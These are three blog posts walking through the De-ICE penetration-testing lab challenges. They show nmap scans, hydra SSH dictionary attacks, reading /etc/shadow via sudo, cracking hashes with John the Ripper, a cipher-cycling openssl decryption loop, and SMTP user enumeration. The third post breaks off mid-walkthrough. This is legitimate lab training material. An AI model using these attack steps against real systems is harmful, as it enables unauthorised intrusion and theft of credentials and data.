@@ -1,0 +1,1435 @@
+ De-ICE hacking challenge: Part 1
+
+ 
+
+·  07/19/11--15:19: De-ICE hacking challenge: Part 1
+
+
+
+Over the weekend I decided to take the De-ICE Live CD Level 1 challenge. De-ICE provides a safe environment where you can practice your penetration testing skills. The Live CDs are free and provided by Heorot.Net. If you've never done a penetration test before, or are looking for practice, these Live CDs are a good place to start.
+
+The Live CDs are available for free once you register with the Heorot.Net forums. Level 1 has two parts to it, running on different Live CDs and can be downloaded here.
+
+I setup two virtual machines, one running Backtrack 4RT2, and one running De-Ice, both setup to use NAT.
+
+Before attacking the target, I needed to get some information about it. So far the only thing I knew was its IP address and that it's a company. Companies usually have websites, so I pointed my web browser to http://192.168.1.100 to see if there was anything there:
+
+
+
+Ok there's some information about the challenge. When I scrolled down I saw a link for the game information. Clicking on that took me to the company's web page which provided a bit of information:
+
+
+
+A list of employee names and their email addresses! The recipient name in an email address is usually the same login name used to log into a server. So I made a list of the employee names into a file and generated a list of possible login names that I could use in a brute force attack. In my previous post I talked about generating a list of login names based off real names. Using that method I came up with the following list:
+
+adamadams
+banterbob
+coffeec
+adamsadam
+adam.adams
+adams.adam
+adamsa
+aadams
+aadam
+a.adams
+a.adam
+bobbanter
+bob.banter
+banter.bob
+banterb
+bbanter
+bbob
+b.banter
+b.bob
+chadcoffee
+coffeechad
+chad.coffee
+coffee.chad
+ccoffee
+cchad
+c.coffee
+c.chad
+mariemary
+marymarie
+marie.mary
+mary.marie
+marym
+mmary
+mmarie
+m.mary
+m.marie
+.
+.
+.
+
+
+Since Adam Adams, Bob Banter, and Chad Coffee are the system administrators and are likely have the highest privileges on the system, I moved their names up on the list. I also start with the user name associated with their email address and assumed that it would be the same login name they would use to access the server.
+
+The next step was to run a port scan to see what services were available. I fired up nmap with the aggressive option set:
+
+nmap -sS -A 192.168.1.100
+Starting Nmap 5.35DC1 ( http://nmap.org ) at 2011-07-19 00:38 EDT
+Nmap scan report for 192.168.1.100
+Host is up (0.00062s latency).
+Not shown: 992 filtered ports
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+|_sshv1: Server supports SSHv1
+| ssh-hostkey: 2048 83:4f:8b:e9:ea:84:20:0d:3d:11:2b:f0:90:ca:79:1c (RSA1)
+| 2048 6f:db:a5:12:68:cd:ad:a9:9c:cd:1e:7b:97:1a:4c:9f (DSA)
+|_2048 ab:ab:a8:ad:a2:f2:fd:c2:6f:05:99:69:40:54:ec:10 (RSA)
+25/tcp  open   smtp?
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_html-title: Site doesn't have a title (text/html).
+110/tcp open   pop3     Openwall popa3d
+|_pop3-capabilities: capa
+143/tcp open   imap     UW imapd 2004.357
+|_imap-capabilities: BINARY THREAD=ORDEREDSUBJECT IMAP4REV1 STARTTLS LOGIN-REFERRALS UNSELECT SCAN SASL-IR THREAD=REFERENCES MAILBOX-REFERRALS SORT AUTH=LOGIN LITERAL+ IDLE NAMESPACE MULTIAPPEND
+443/tcp closed https
+MAC Address: 00:0C:29:51:61:57 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS details: Linux 2.6.13 - 2.6.31
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.62 ms 192.168.1.100
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 166.60 seconds
+
+
+Lots of services running that are worth exploring. Since I had already created a list of possible login names, and the server has SSH open, I decided to try an SSH dictionary attack using hydra. Backtrack comes with several wordlists containing possible passwords. I actually ended up using a customized one that contains approximately 980,000 passwords in non-alphabetical order.
+
+With my login name list and password list ready, I fired up hydra:
+
+/opt/hydra6/bin/hydra -L users.txt -P passwords.txt -t 5 -v -V -e n -e s -o results.txt 192.168.1.100 ssh
+
+
+While this was running, I decided to explore the other services nmap reported. FTP seemed to be broken, so connecting to it was futile. I used searchsploit to see if I could find any available exploits for the services I found, but nothing stood out, so I decided to wait for hydra to generate results.
+
+The user names adamadams, banterb, and coffeec did not result in any passwords. So now there were two possibilities; I didn't have their passwords in my password list, or the login names were different. I decided to wait it out and let hydra go through the rest of the login names and see if it would get a bite.
+
+hydra delivered and rewarded me with a password for aadams: nostradamus. Now that I had a better idea of the format for the login name, I tailored my login name list accordingly to use the first character of the first name followed by the last name and ran hydra again.
+
+With hydra running in the background, I went ahead and logged into the server via SSH with aadams's credentials. Once I was in, the first thing I decided to do was to see what privileges aadams had:
+
+root@lascars# ssh aadams@192.168.1.100
+aadams@192.168.1.100's password:
+Linux 2.6.16.
+aadams@slax:~$ id
+uid=1000(aadams) gid=10(wheel) groups=10(wheel)
+aadams@slax:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password:
+User aadams may run the following commands on this host:
+    (root) NOEXEC: /bin/ls
+    (root) NOEXEC: /usr/bin/cat
+    (root) NOEXEC: /usr/bin/more
+    (root) NOEXEC: !/usr/bin/su *root*
+
+
+The cat command running under sudo meant that I'd be able to read /etc/shadow which contains the encrypted passwords for all the users on the server. With that in mind, I grabbed the user entries in /etc/passwd and /etc/shadow:
+
+# /etc/passwd
+root:x:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
+aadams:x:1000:10:,,,:/home/aadams:/bin/bash
+bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
+ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
+
+ 
+
+# /etc/shadow
+root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
+aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
+bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
+ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
+
+
+I saved them to mypass.txt and myshad.txt respectively and merged them using unshadow to create a file primed for password cracking with John The Ripper:
+
+/pentest/passwords/jtr/unshadow mypass.txt myshad.txt > unshadowed.txt
+/pentest/passwords/jtr/john --wordlist=passwords.txt unshadowed.txt
+
+
+While waiting for john to finish, I checked to see what progress hydra had made and found that it had discovered the passwords for bbanter and ccoffee. I stopped john and removed those users from the unshadowed.txt file which left only the root account left to crack, and ran john again.
+
+Eventually john successfully cracked the root password, which turned out to be tarot. I decide to give it a try:
+
+aadams@slax:~$ su -
+Password: *****
+root@slax:~# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+
+
+The server had been successfully rooted. At this point I figured the game was over. I went back to the dummy company website to look at the hints page and see if I had done everything correctly. As it turns out, there was one more challenge - obtain the CEO's bank account information.
+
+I decided to explore the FTP service again, so I went to /home/ftp/incoming and found a file called salary_dec2003.csv.enc. The file command told me it was just data, which didn't help me much, so I tried strings to see if I could find anything readable in there:
+
+root@slax:/home/ftp/incoming# file salary_dec2003.csv.enc
+salary_dec2003.csv.enc: data
+root@slax:/home/ftp/incoming# strings salary_dec2003.csv.enc | head
+Salted__n
+Lw$A`
+YN>7
+#ki8
+
+
+The string "Salted__n" looked interesting. I did a bit of Googling and found that "Salted__" is the first 8 bytes in an encrypted file created by the openssl command. The problem now was to figure out the cipher and the password that were used to encrypt the file. I recalled that the /etc/passwd entry for root had an odd comment: "DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION". Assuming that probably meant the root password tarot was used to encrypt this file, I decided to write a script to cycle through all the ciphers in openssl and pair it with the password tarot to see if I could decrypt the file:
+
+ciphers=`openssl list-cipher-commands`
+for i in $ciphers; do
+ openssl enc -d -${i} -in salary_dec2003.csv.enc -k tarot > /dev/null 2>&1
+ if [[ $? -eq 0 ]]; then
+  echo "Cipher is $i: openssl enc -d -${i} -in salary_dec2003.csv.enc -k tarot -out foo.csv"
+  exit
+ fi
+done
+
+
+Fingers crossed, I ran the script and it immediately gave me a result:
+
+root@lascars# ./cipher-cycle.sh
+Cipher is aes-128-cbc: openssl enc -d -aes-128-cbc -in salary_dec2003.csv.enc -k tarot -out foo.csv
+
+
+I had it print out the command for me as well so I could just copy and paste it if it found the correct cipher:
+
+root@lascars#  openssl enc -d -aes-128-cbc -in salary_dec2003.csv.enc -k tarot -out foo.csv
+root@lascars# head foo.csv
+,Employee information,,,,,,,,,,,,,,
+,Employee ID,Name,Salary,Tax Status,Federal Allowance (From W-4),State Tax (Percentage),Federal Income Tax (Percentage based on Federal Allowance),Social Security Tax (Percentage),Medicare Tax (Percentage),Total Taxes Withheld (Percentage),"Insurance
+Deduction
+(Dollars)","Other Regular
+Deduction
+(Dollars)","Total Regular Deductions (Excluding taxes, in dollars)","Direct Deposit Info
+Routing Number","Direct Deposit Info
+Account Number"
+,1,Charles E. Ophenia,"$225,000.00",1,4,2.30%,28.00%,6.30%,1.45%,38.05%,$360.00,$500.00,$860.00,183200299,1123245
+,2,Marie Mary,"$56,000.00",1,2,2.30%,28.00%,6.30%,1.45%,38.05%,$125.00,$100.00,$225.00,183200299,1192291
+
+
+With the server rooted and the salary file decrypted, the challenge is over. The whole thing took a few hours, mostly waiting for hydra to find a working login name and password combination that worked. Once that was done, the rest was a breeze.
+
+In my next post I'll discuss how I solved part 2 of the level 1 challenge.
+
+ 
+
+http://techorganic1.rssing.com/inc/img/tmbtn.png
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tup-blue.png
+	
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tdown-blue.png
+
+·  07/20/11--07:16: De-ICE hacking challenge: Part 2
+
+
+
+
+In my previous post I talked about how I completed part 1 of the De-ICE hacking challenge. If you're not sure what De-ICE is, I recommend reading my last post and checking out Heorot.Net, home of the De-ICE penetration testing Live CDs.
+
+The second challenge requires breaking into an FTP server, which is supposedly more secure than the server in the first challenge. The FTP server has an IP address of 192.168.1.110. I'm using the same setup, with my attacking machine running Backtrack 4RT2, and the target running under VMware.
+
+As before, I fired up the web browser to see what they had on there:
+
+
+
+A relatively simple website, again with the email addresses and names of the systems administrators. I noted this information down and proceeded to check what ports were running on their FTP server:
+
+root@tantras# nmap -sS -A 192.168.1.110
+
+Starting Nmap 5.35DC1 ( http://nmap.org ) at 2011-07-19 20:00 EDT
+Nmap scan report for 192.168.1.110
+Host is up (0.00042s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE VERSION
+21/tcp  open  ftp     vsftpd 2.0.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp  open  ssh?
+80/tcp  open  http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_html-title: Site doesn't have a title (text/html).
+631/tcp open  ipp     CUPS 1.1
+MAC Address: 00:0C:29:97:05:79 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS details: Linux 2.6.13 - 2.6.31
+Network Distance: 1 hop
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.42 ms 192.168.1.110
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 80.25 seconds
+
+
+SSH is open on this server. I had already cracked the passwords for the systems administrators in part 1, so I decided to see if they would work. In the real world, people tend to use the same passwords for a lot of their machines. In this case, none of the passwords in the first challenge worked.
+
+I thought about running hydra again to guess the passwords, but decided to hold off on it because I knew it would take a long time to complete. It looked like anonymous FTP was allowed, so I decided to try that avenue first. I connected as an anonymous user to the FTP server and listed the contents of some of the directories. To my surprise I found a etc/shadow file buried in there.
+
+root@tantras# ftp 192.168.1.110
+Connected to 192.168.1.110.
+220 (vsFTPd 2.0.4)
+Name (192.168.1.110:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    7 1000     513           160 Mar 15  2007 download
+drwxrwxrwx    2 0        0              60 Feb 26  2007 incoming
+226 Directory send OK.
+ftp> ls incoming
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> ls download
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    6 1000     513           340 Mar 15  2007 etc
+drwxr-xr-x    4 1000     513           100 Mar 15  2007 opt
+drwxr-xr-x   10 1000     513           400 Mar 15  2007 root
+drwxr-xr-x    5 1000     513           120 Mar 15  2007 usr
+drwxr-xr-x    3 1000     513            80 Mar 15  2007 var
+226 Directory send OK.
+ftp> ls download/etc/
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    4 1000     513           160 Mar 15  2007 X11
+-rw-r--r--    1 1000     513        362436 Mar 03  2007 core
+drwxr-xr-x    2 1000     513           100 Mar 15  2007 fonts
+-rw-r--r--    1 1000     513           780 Apr 30  2005 hosts
+-rw-r--r--    1 1000     513           718 Jul 03  2005 inputrc
+-rw-r--r--    1 1000     513          1296 Jun 10  2006 issue
+-rw-r--r--    1 1000     513           183 Jun 23  2005 lisarc
+-rw-r--r--    1 1000     513            56 Oct 21  2004 localtime
+lrwxrwxrwx    1 1000     513            23 Jul 19 18:28 localtime-copied-from -> /usr/share/zoneinfo/GMT
+-rw-r--r--    1 1000     513         10289 Dec 31  2003 login.defs
+-rw-r--r--    1 1000     513             1 Dec 31  2003 motd-slax
+drwxr-xr-x    2 1000     513           100 Mar 15  2007 profile.d
+drwxr-xr-x    2 1000     513           220 Mar 15  2007 rc.d
+-rw-r--r--    1 1000     513           440 Jul 18  2006 shadow
+226 Directory send OK.
+
+
+I thought that if it were a real shadow file, then I'd be able to crack some user accounts. I decided to download the contents of the FTP server so I could examine all the directories and files properly:
+
+root@tantras# wget -rq ftp://192.168.1.110
+root@tantras# ls
+192.168.1.110
+
+
+Now that I had mirrored the FTP server, I decided to take a closer look at the shadow file:
+
+root@tantras# cat shadow
+root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+smmsp:*:9797:0:::::
+mysql:*:9797:0:::::
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+nobody:*:9797:0:::::
+
+
+Only the root account was listed in there, so no encrypted passwords for the system administrators. In the previous challenge, root was not allowed to SSH into the server. I assumed it would be the same for this challenge, which meant cracking the root password now might not benefit me that much until I could actually log into the server.
+
+I took another look at the contents of the etc directory and noticed a core file. This is typically a core dump, which meant it probably held some juicy bits of information. I fired up strings and paged through the contents of the dump. I found the interesting bits at the very end of the file:
+
+.gnu.version
+.gnu.version_d
+.text
+.note
+.eh_frame_hdr
+.eh_frame
+.dynamic
+.useless
+root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
+bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::
+::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:
+0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:979
+7:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::game
+s:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::m
+ysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0::::
+:gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0::
+:::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0
+:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy
+1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0p
+DXCCMQu70/:13574:0:99999:7:::
+
+
+Looks like /etc/shadow entries for the root account and the system administrators! Now if I could crack one of their passwords, I'd be able to log in through SSH and su to root. After a bit of cutting and pasting, I ended up with a shadow file that looked like this:
+
+root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
+aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
+bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
+ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::
+
+
+To crack this using john, I needed the corresponding passwd file which I didn't have. Fortunately it's easy enough to just create a dummy passwd file and insert the encrypted passwords into it. I wrote a short script to do it for me:
+
+#!/usr/bin/env python
+# shadow2pass: generate a dummy passwd file with
+# the encrypted passwords from a shadow file
+
+import sys
+
+start_uid = 500  # random UID
+start_gid = 500  # random GID
+for line in open(sys.argv[1]):
+    a = line.split(":")
+    print "%s:%s:%d:%d:,,,:/home/%s:/bin/bash" % \
+        (a[0], a[1], start_uid, start_gid, a[0])
+    start_uid += 1
+
+
+I ran the script and passed it the shadow file and it gave me an unshadowed passwd file:
+
+root@tantras# ~/bin/shadow2pass myshadow.txt > mypass.txt
+root@tantras# cat mypass.txt
+root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:500:500:,,,:/home/root:/bin/bash
+aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:501:500:,,,:/home/aadams:/bin/bash
+bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:502:500:,,,:/home/bbanter:/bin/bash
+ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:503:500:,,,:/home/ccoffee:/bin/bash
+
+
+Now I had a proper file that I could run through john for cracking. I decided to use the same customized password list I had used before. After waiting several minutes, john finished running without cracking any passwords. Either my password list was too small, or the passwords were too complicated which meant I'd have to switch to a brute force attack which could take a very long time. I decided to try a larger password list to see if it would be more fruitful:
+
+root@tantras# /pentest/passwords/jtr/john --wordlist=/pentest/passwords/wordlists/darkc0de.lst mypass.txt
+Loaded 4 password hashes with 4 different salts (FreeBSD MD5 [32/32])
+Complexity       (root)
+Zymurgy          (bbanter)
+guesses: 2  time: 0:00:11:10 100.00% (ETA: Tue Jul 19 20:52:28 2011)  c/s: 5369  trying: �f
+
+
+Two passwords cracked, one for root and one for bbanter. I recalled that bbanter was an intern in the first challenge, and I hoped that his account would at least allow me to su to root. Armed with his password, I logged in to the server via SSH:
+
+root@tantras# ssh bbanter@192.168.1.110
+The authenticity of host '192.168.1.110 (192.168.1.110)' can't be established.
+RSA key fingerprint is 3b:5c:88:a9:a3:d7:96:88:1b:54:0d:0b:f3:06:a9:de.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.110' (RSA) to the list of known hosts.
+bbanter@192.168.1.110's password:
+Linux 2.6.16.
+bbanter@slax:~$ id
+uid=1001(bbanter) gid=100(users) groups=100(users)
+
+
+A successful login, I went ahead and tried to get root:
+
+bbanter@slax:~$ su -
+Password: **********
+root@slax:~# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+
+
+Success! The server has been rooted. Now that I had unrestricted access, I started exploring a bit more. After several minutes of poking around in /etc, I ended up in /home. The system administrator home directories contained nothing of interest. It was curious however that there was a /home/root considering root's home directory is actually /root. I looked inside the directory and found a hidden directory .save which contained a couple of interesting files:
+
+root@slax:/home/root/.save# ls -l
+total 8
+-r-x------ 1 root   root 198 Mar 13  2007 copy.sh*
+-rw-r--r-- 1 aadams  513 560 Mar 13  2007 customer_account.csv.enc
+
+
+In the first challenge, I encountered a file salary_dec2003.csv.enc that turned out to be a file encrypted with openssl. I assumed this was yet another openssl encrypted file. I decided to leave that alone for a minute and look at the contents of copy.sh:
+
+#!/bin/sh
+#encrypt files in ftp/incoming
+openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out /home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw
+#remove old file
+rm /home/ftp/incoming/$1
+
+
+It looked to be the script that created the encrypted customer_account.csv.enc. The cipher used and the password were all in the script, so I copied the openssl command in the file, set the decryption option and was able to obtain the file's contents:
+
+root@slax:/home/root/.save# openssl enc -d -aes-256-cbc -salt -in ./customer_account.csv.enc -pass file:/etc/ssl/certs/pw
+"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
+1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
+1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
+1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
+1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
+1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
+1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"
+
+
+It worked! The decrypted file contains credit card information of customers. At this point I decided to look at the hints page to see if I had completed all the tasks, and sure enough, the challenge was over.
+
+An alternative way to get into the server would be to run an SSH dictionary attack against the SSH service using hydra and waiting to get a working login name and password combination. I decided not to go through this route because it just takes too long.
+
+Overall I found part 2 to be much easier and a little more fun since it involved a bit more detective work to figure out how to penetrate the system. De-ICE has a level 2 challenge available, but I have yet to try it. When I do, I will post my experience and solutions to solving the challenge.
+
+ 
+
+http://techorganic1.rssing.com/inc/img/tmbtn.png
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tup-blue.png
+	
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tdown-blue.png
+
+·  08/01/11--07:57: De-ICE hacking challenge: Part 3
+
+
+
+
+This is a walkthrough on how I completed level 2 of the De-ICE penetration testing Live CDs. I had completed level 1 a week before and talked about my experiences in a two part post (part 1 and part 2). If you're interested in learning some hacking in a safe environment, I recommend checking out Heorot.net and downloading the De-ICE Live CDs.
+
+Level 2 offers no hints on their page regarding the target server. The only bit of immediate information is on the target company website, which just lists employee names and email addresses:
+
+
+
+I copied down the employee names and generated a list of possible login names that might be used on the server using a script I wrote:
+
+t.weller
+w.tony
+tony
+weller
+estellahavisham
+havishamestella
+estella.havisham
+havisham.estella
+havishame
+ehavisham
+hestella
+e.havisham
+h.estella
+estella
+havisham
+abelmagwitch
+magwitchabel
+abel.magwitch
+magwitch.abel
+
+
+This resulted in over 200 possible combinations. I needed to narrow that list down if I wanted to do a brute force attack. I put it aside at the moment and did a port scan to determine what services were exposed:
+
+root@syconium# nmap -sS -A -oN nmap.txt 192.168.2.100
+Nmap scan report for 192.168.2.100
+Host is up (0.00039s latency).
+Not shown: 992 filtered ports
+PORT    STATE  SERVICE  VERSION
+20/tcp  closed ftp-data
+21/tcp  open   ftp      vsftpd 2.0.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)
+|_sshv1: Server supports SSHv1
+| ssh-hostkey: 2048 83:4f:8b:e9:ea:84:20:0d:3d:11:2b:f0:90:ca:79:1c (RSA1)
+| 2048 6f:db:a5:12:68:cd:ad:a9:9c:cd:1e:7b:97:1a:4c:9f (DSA)
+|_2048 ab:ab:a8:ad:a2:f2:fd:c2:6f:05:99:69:40:54:ec:10 (RSA)
+25/tcp  open   smtp     Sendmail 8.13.7/8.13.7
+| smtp-commands: slax.example.net Hello [192.168.2.128], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, 8BITMIME, SIZE, DSN, ETRN, AUTH DIGEST-MD5 CRAM-MD5, DELIVERBY, HELP
+|_ 2.0.0 This is sendmail version 8.13.7 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation see 2.0.0 http://www.sendmail.org/email-addresses.html 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
+|_html-title: Site doesn't have a title (text/html).
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+110/tcp open   pop3     Openwall popa3d
+|_pop3-capabilities: capa
+143/tcp open   imap     UW imapd 2004.357
+|_imap-capabilities: BINARY THREAD=ORDEREDSUBJECT IMAP4REV1 STARTTLS LOGIN-REFERRALS UNSELECT SCAN SASL-IR THREAD=REFERENCES MAILBOX-REFERRALS SORT AUTH=LOGIN LITERAL+ IDLE NAMESPACE MULTIAPPEND
+443/tcp closed https
+MAC Address: 00:0C:29:94:D5:FA (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS details: Linux 2.6.13 - 2.6.31
+Network Distance: 1 hop
+Service Info: Host: slax.example.net; OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.39 ms 192.168.2.100
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+# Nmap done at Sat Jul 23 10:25:53 2011 -- 1 IP address (1 host up) scanned in 13.79 seconds
+
+
+SMTP was open, I wondered if I could use that to determine valid user accounts. I fired up metasploit and ran smtp_enum against the target. I got lucky and it confirmed three valid accounts:
+
+auxiliary(smtp_enum) > run
+
+[*] 220 slax.example.net ESMTP Sendmail 8.13.7/8.13.7; Sat, 23 Jul 2011 10:32:18 GMT
+
+[*] Domain Name: example.net
+[+] 192.168.2.100:25 - Found user: havisham
+[+] 192.168.2.100:25 - Found user: magwitch
+[+] 192.168.2.100:25 - Found user: pirrip
+[-] 192.168.2.100:25 - EXPN : 502 5.7.0 Sorry, we do not allow this operation
+[+] 192.168.2.100:25 Users found: havisham, magwitch, pirrip
+[*] 192.168.2.100:25 No e-mail addresses found.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+I created a new list of login names with those valid names and fired up hydra against the target. I exhausted a couple of large wordlists and gave up on this venue of attack. Whatever their passwords were, they weren't in any of my wordlists.
+
+The next thing I decided to do was to see if there was anything else residing on their web server. I was looking for any interesting directories or files that weren't linked from the main page. I used nikto and dirbuster for this. Both of them reported similar outputs, but nikto in particular discovered that info.php was exposed:
+
+root@syconium# cd /pentest/web/nikto
+root@syconium# ./nikto.pl -config nikto.conf -host 192.168.2.100
+- Nikto v2.1.4
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.100
++ Target Hostname:    192.168.2.100
++ Target Port:        80
++ Start Time:         2011-07-23 11:27:19
+---------------------------------------------------------------------------
++ Server: Apache/2.0.55 (Unix) PHP/5.1.2
++ Retrieved x-powered-by header: PHP/5.1.2
++ PHP/5.1.2 appears to be outdated (current is at least 5.3.5)
++ Apache/2.0.55 appears to be outdated (current is at least Apache/2.2.17). Apache 1.3.42 (final release) and 2.0.64 are also current.
+
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
++ 6448 items checked: 2 error(s) and 11 item(s) reported on remote host
++ End Time:           2011-07-29 11:28:10 (51 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+info.php contained a lot of information including services running in the background. This version of Apache and PHP were vulnerable to several XSS exploits, but were of no use to me in terms of rooting the server.
+
+I tried connecting to the FTP server but it was broken and would keep disconnecting me. I also looked into the open IMAP service but that proved fruitless. At this point I felt that I had hit a brick wall and took a break.
+
+A couple of days later, it occurred to me that maybe the server was configured to periodically send out data, maybe to simulate a user accessing a webpage or something. I thought if I listened in on the network, maybe I'd see something. I started by running netdiscover to see if anything else was broadcasting on the network. To my surprise, there was a second IP address, 192.168.2.101!
+
+Currently scanning: 192.168.25.0/16   |   Screen View: Unique Hosts                                                                          
+
+ 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                                                              
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                  
+ -----------------------------------------------------------------------------
+ 192.168.2.1     00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                
+ 192.168.2.2     00:50:56:ee:cf:20    01    060   VMWare, Inc.                                                                                
+ 192.168.2.100   00:0c:29:94:d5:fa    01    060   VMware, Inc.                                                                                
+ 192.168.2.101   00:0c:29:94:d5:fa    01    060   VMware, Inc.                                                                                
+ 192.168.2.254   00:50:56:e6:02:53    01    060   VMWare, Inc.
+
+
